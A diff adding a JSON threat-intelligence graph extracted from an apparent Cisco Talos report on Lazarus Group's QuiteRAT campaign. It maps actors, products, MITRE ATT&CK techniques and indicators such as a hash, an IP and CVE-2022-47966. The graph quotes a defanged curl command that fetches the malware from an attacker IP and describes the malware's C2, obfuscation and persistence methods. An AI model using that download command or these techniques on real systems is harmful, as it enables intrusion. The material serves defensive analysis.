@@ -1,0 +1,740 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_0032a51c801f",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "QuiteRAT",
+        "sentence_indices": [
+          2,
+          3,
+          8,
+          11,
+          13,
+          15,
+          16,
+          17,
+          21,
+          22,
+          24,
+          41,
+          42
+        ],
+        "span_sentences": [
+          "In this campaign, the attackers began exploiting a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) five days after PoCs for the exploit were publicly disclosed to deliver and deploy a newer malware threat we track as “QuiteRAT.” Security researchers first discovered this implant in February, but little has been written on it since then.",
+          "QuiteRAT has many of the same capabilities as Lazarus Group’s better-known MagicRAT malware, but its file size is significantly smaller.",
+          "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT.",
+          "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe.",
+          "A successful download of the binary leads to the execution of the QuiteRAT binary by the Java process, resulting in the activation of the implant on the infected server.",
+          "There is no in-built persistence mechanism in QuiteRAT.",
+          "Persistence for the implant is achieved via the registry by issuing the following command to QuiteRAT:.",
+          "QuiteRAT is a fairly simple remote access trojan (RAT).",
+          "Although QuiteRAT, just like MagicRAT, uses embedded Qt libraries, none of these implants have a Graphical User Interface.",
+          "Based on QuiteRAT’s technical characteristics, including the usage of the Qt framework, we assess that this implant belongs to the previously disclosed MagicRAT family.",
+          "The new campaign we’re disclosing exploited a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) — which has a Kenna risk score of 100 out of 100 — to deploy QuiteRAT.",
+          "The use of MagicRAT’s derivative implant, QuiteRAT, beginning in May 2023 suggests the actor is changing tactics, opting for a smaller, more compact Qt-based implant.",
+          "There are similarities between the implants that indicate that QuiteRAT is a derivative of MagicRAT."
+        ],
+        "edges": [
+          "EDGE_22089e4df493",
+          "EDGE_26474d40dc1b",
+          "EDGE_4a5a4dd9ca35",
+          "EDGE_5e1509f969f6",
+          "EDGE_89318e9bef34",
+          "EDGE_91904d83ceab",
+          "EDGE_9300a4803403",
+          "EDGE_9ffaab14ca6e",
+          "EDGE_cb0a24e4fd1d"
+        ]
+      },
+      {
+        "node_id": "HL_11737b3d12b5",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "United States",
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_1acf563eb8bf",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "WithSecure",
+        "sentence_indices": [
+          23
+        ],
+        "span_sentences": [
+          "QuiteRAT was briefly discussed in WithSecure’s report from early 2023."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_2e9e1d15ef40",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Europe",
+        "sentence_indices": [
+          0,
+          8
+        ],
+        "span_sentences": [
+          "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States.",
+          "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_4356fdbfda59",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Kenna",
+        "sentence_indices": [
+          24
+        ],
+        "span_sentences": [
+          "The new campaign we’re disclosing exploited a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) — which has a Kenna risk score of 100 out of 100 — to deploy QuiteRAT."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_468625070e08",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Cisco Talos",
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_51adab691386",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Qt framework",
+        "sentence_indices": [
+          4,
+          5,
+          19
+        ],
+        "span_sentences": [
+          "Both implants are built on the Qt framework and include capabilities such as arbitrary command execution.",
+          "Lazarus Group’s increasing use of the Qt framework creates challenges for defenders.",
+          "The Qt framework is a platform for developing cross-platform applications."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_62a599a11f56",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "healthcare entities",
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_689a82869e5a",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "Lazarus Group",
+        "sentence_indices": [
+          0,
+          3,
+          5,
+          8,
+          11
+        ],
+        "span_sentences": [
+          "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States.",
+          "QuiteRAT has many of the same capabilities as Lazarus Group’s better-known MagicRAT malware, but its file size is significantly smaller.",
+          "Lazarus Group’s increasing use of the Qt framework creates challenges for defenders.",
+          "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT.",
+          "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+        ],
+        "edges": [
+          "EDGE_1c8221338a2c",
+          "EDGE_338ade9a3c12",
+          "EDGE_c8825bb9df74"
+        ]
+      },
+      {
+        "node_id": "HL_8d467c5d7918",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "ManageEngine ServiceDesk",
+        "sentence_indices": [
+          2,
+          9,
+          24
+        ],
+        "span_sentences": [
+          "In this campaign, the attackers began exploiting a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) five days after PoCs for the exploit were publicly disclosed to deliver and deploy a newer malware threat we track as “QuiteRAT.” Security researchers first discovered this implant in February, but little has been written on it since then.",
+          "The actors exploited a vulnerable ManageEngine ServiceDesk instance to gain initial access.",
+          "The new campaign we’re disclosing exploited a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) — which has a Kenna risk score of 100 out of 100 — to deploy QuiteRAT."
+        ],
+        "edges": [
+          "EDGE_cd6b7971419f"
+        ]
+      },
+      {
+        "node_id": "HL_ac8bcc9b2102",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "internet backbone infrastructure",
+        "sentence_indices": [
+          0,
+          8
+        ],
+        "span_sentences": [
+          "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States.",
+          "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_c6426a20d0e4",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "cURL",
+        "sentence_indices": [
+          11
+        ],
+        "span_sentences": [
+          "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+        ],
+        "edges": [
+          "EDGE_078f029bf19d",
+          "EDGE_e73679f7cb65"
+        ]
+      },
+      {
+        "node_id": "HL_e19e2be46270",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Java runtime",
+        "sentence_indices": [
+          10
+        ],
+        "span_sentences": [
+          "The successful exploitation triggered the immediate download and execution of a malicious binary via the Java runtime process."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "HL_e317a3974fac",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "MagicRAT",
+        "sentence_indices": [
+          3,
+          21,
+          22,
+          39,
+          40,
+          41,
+          42
+        ],
+        "span_sentences": [
+          "QuiteRAT has many of the same capabilities as Lazarus Group’s better-known MagicRAT malware, but its file size is significantly smaller.",
+          "Although QuiteRAT, just like MagicRAT, uses embedded Qt libraries, none of these implants have a Graphical User Interface.",
+          "Based on QuiteRAT’s technical characteristics, including the usage of the Qt framework, we assess that this implant belongs to the previously disclosed MagicRAT family.",
+          "The latest version of Lazarus Group’s older MagicRAT implant observed in the wild was compiled in April 2022.",
+          "This is the last version of MagicRAT that we know of.",
+          "The use of MagicRAT’s derivative implant, QuiteRAT, beginning in May 2023 suggests the actor is changing tactics, opting for a smaller, more compact Qt-based implant.",
+          "There are similarities between the implants that indicate that QuiteRAT is a derivative of MagicRAT."
+        ],
+        "edges": []
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1016",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1016",
+        "ttp_id": "T1016",
+        "best_span_sentences_list": [
+          [
+            "The implant initially gathers some rudimentary information about the infected endpoint, including MAC addresses, IP addresses, and the current user name of the device."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            25,
+            25
+          ]
+        ],
+        "edges": [
+          "EDGE_cb0a24e4fd1d"
+        ]
+      },
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "All the networking-related configurations, such as the C2 URLs and extended URI parameters, are encoded and stored in the malware.",
+            "The strings are XOR’ed with 0x78 and then base64 encoded."
+          ],
+          [
+            "Both implants also use base64 encoding to obfuscate their strings with an additional measure, such as XOR or prepending hardcoded data, to make it difficult to decode the strings automatically."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            27,
+            28
+          ],
+          [
+            44,
+            44
+          ]
+        ],
+        "edges": [
+          "EDGE_9ffaab14ca6e"
+        ]
+      },
+      {
+        "node_id": "TTP_T1033",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1033",
+        "ttp_id": "T1033",
+        "best_span_sentences_list": [
+          [
+            "The implant initially gathers some rudimentary information about the infected endpoint, including MAC addresses, IP addresses, and the current user name of the device."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            25,
+            25
+          ]
+        ],
+        "edges": [
+          "EDGE_5e1509f969f6"
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "Both implants are built on the Qt framework and include capabilities such as arbitrary command execution."
+          ],
+          [
+            "The successful exploitation triggered the immediate download and execution of a malicious binary via the Java runtime process.",
+            "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+          ],
+          [
+            "Once the implant starts running, it sends out preliminary system information to its command and control (C2) servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmd.exe process."
+          ],
+          [
+            "The malware also has the ability to run a ping command on a random IP address that it generates on the fly."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            4,
+            4
+          ],
+          [
+            10,
+            11
+          ],
+          [
+            14,
+            14
+          ],
+          [
+            32,
+            32
+          ]
+        ],
+        "edges": [
+          "EDGE_1c8221338a2c",
+          "EDGE_9300a4803403",
+          "EDGE_afc0846cafa1",
+          "EDGE_e73679f7cb65"
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "Once the implant starts running, it sends out preliminary system information to its command and control (C2) servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmd.exe process."
+          ],
+          [
+            "The implant also has the ability to receive a second URL from the current C2 server via the command code receivemail\n."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            14,
+            14
+          ],
+          [
+            37,
+            37
+          ]
+        ],
+        "edges": [
+          "EDGE_91904d83ceab"
+        ]
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1082",
+        "ttp_id": "T1082",
+        "best_span_sentences_list": [
+          [
+            "Once the implant starts running, it sends out preliminary system information to its command and control (C2) servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmd.exe process."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            14,
+            14
+          ]
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1105",
+        "ttp_id": "T1105",
+        "best_span_sentences_list": [
+          [
+            "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT."
+          ],
+          [
+            "The successful exploitation triggered the immediate download and execution of a malicious binary via the Java runtime process.",
+            "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            8,
+            8
+          ],
+          [
+            10,
+            11
+          ]
+        ],
+        "edges": [
+          "EDGE_0706e16453d0",
+          "EDGE_078f029bf19d",
+          "EDGE_26474d40dc1b",
+          "EDGE_6b424c67f46e",
+          "EDGE_8c7af8c62b7e",
+          "EDGE_c8825bb9df74"
+        ]
+      },
+      {
+        "node_id": "TTP_T1112",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1112",
+        "ttp_id": "T1112",
+        "best_span_sentences_list": [
+          [
+            "Persistence for the implant is achieved via the registry by issuing the following command to QuiteRAT:."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            16
+          ]
+        ],
+        "edges": [
+          "EDGE_22089e4df493"
+        ]
+      },
+      {
+        "node_id": "TTP_T1132",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1132",
+        "ttp_id": "T1132",
+        "best_span_sentences_list": [
+          [
+            "All the networking-related configurations, such as the C2 URLs and extended URI parameters, are encoded and stored in the malware.",
+            "The strings are XOR’ed with 0x78 and then base64 encoded."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            27,
+            28
+          ]
+        ],
+        "edges": [
+          "EDGE_4a5a4dd9ca35"
+        ]
+      },
+      {
+        "node_id": "TTP_T1190",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1190",
+        "ttp_id": "T1190",
+        "best_span_sentences_list": [
+          [
+            "In this campaign, the attackers began exploiting a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) five days after PoCs for the exploit were publicly disclosed to deliver and deploy a newer malware threat we track as “QuiteRAT.” Security researchers first discovered this implant in February, but little has been written on it since then."
+          ],
+          [
+            "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT.",
+            "The actors exploited a vulnerable ManageEngine ServiceDesk instance to gain initial access."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            8,
+            9
+          ]
+        ],
+        "edges": [
+          "EDGE_338ade9a3c12",
+          "EDGE_89318e9bef34",
+          "EDGE_cd347e1fa5c2",
+          "EDGE_cd6b7971419f"
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_2438fd6edfb6",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6",
+        "sentence_indices": [
+          46
+        ],
+        "span_sentences": [
+          "Hashes\nQuiteRAT\ned8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6."
+        ],
+        "edges": []
+      },
+      {
+        "node_id": "IOC_32375433d366",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "c:\\users\\public\\notify[.]exe.",
+        "sentence_indices": [
+          11
+        ],
+        "span_sentences": [
+          "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+        ],
+        "edges": [
+          "EDGE_0706e16453d0"
+        ]
+      },
+      {
+        "node_id": "IOC_87e0ac3e1872",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "146[.]4[.]21[.]94",
+        "sentence_indices": [
+          11,
+          12
+        ],
+        "span_sentences": [
+          "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe.",
+          "The IP address 146[.]4[.]21[.]94 has been used by Lazarus since at least May 2022."
+        ],
+        "edges": [
+          "EDGE_8c7af8c62b7e"
+        ]
+      },
+      {
+        "node_id": "IOC_8ca059eaa156",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat",
+        "sentence_indices": [
+          11
+        ],
+        "span_sentences": [
+          "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+        ],
+        "edges": [
+          "EDGE_6b424c67f46e",
+          "EDGE_afc0846cafa1"
+        ]
+      },
+      {
+        "node_id": "IOC_a0b9506a1b80",
+        "node_class": "ioc",
+        "node_type": "CVE",
+        "node_text": "CVE-2022-47966",
+        "sentence_indices": [
+          2,
+          24
+        ],
+        "span_sentences": [
+          "In this campaign, the attackers began exploiting a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) five days after PoCs for the exploit were publicly disclosed to deliver and deploy a newer malware threat we track as “QuiteRAT.” Security researchers first discovered this implant in February, but little has been written on it since then.",
+          "The new campaign we’re disclosing exploited a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) — which has a Kenna risk score of 100 out of 100 — to deploy QuiteRAT."
+        ],
+        "edges": [
+          "EDGE_cd347e1fa5c2"
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_0706e16453d0",
+      "node_u": "IOC_32375433d366",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_078f029bf19d",
+      "node_u": "HL_c6426a20d0e4",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1c8221338a2c",
+      "node_u": "HL_689a82869e5a",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_22089e4df493",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1112",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_26474d40dc1b",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_338ade9a3c12",
+      "node_u": "HL_689a82869e5a",
+      "node_v": "TTP_T1190",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4a5a4dd9ca35",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1132",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5e1509f969f6",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1033",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6b424c67f46e",
+      "node_u": "IOC_8ca059eaa156",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_89318e9bef34",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1190",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8c7af8c62b7e",
+      "node_u": "IOC_87e0ac3e1872",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_91904d83ceab",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_9300a4803403",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_9ffaab14ca6e",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_afc0846cafa1",
+      "node_u": "IOC_8ca059eaa156",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c8825bb9df74",
+      "node_u": "HL_689a82869e5a",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_cb0a24e4fd1d",
+      "node_u": "HL_0032a51c801f",
+      "node_v": "TTP_T1016",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_cd347e1fa5c2",
+      "node_u": "IOC_a0b9506a1b80",
+      "node_v": "TTP_T1190",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_cd6b7971419f",
+      "node_u": "HL_8d467c5d7918",
+      "node_v": "TTP_T1190",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e73679f7cb65",
+      "node_u": "HL_c6426a20d0e4",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    }
+  ]
+}
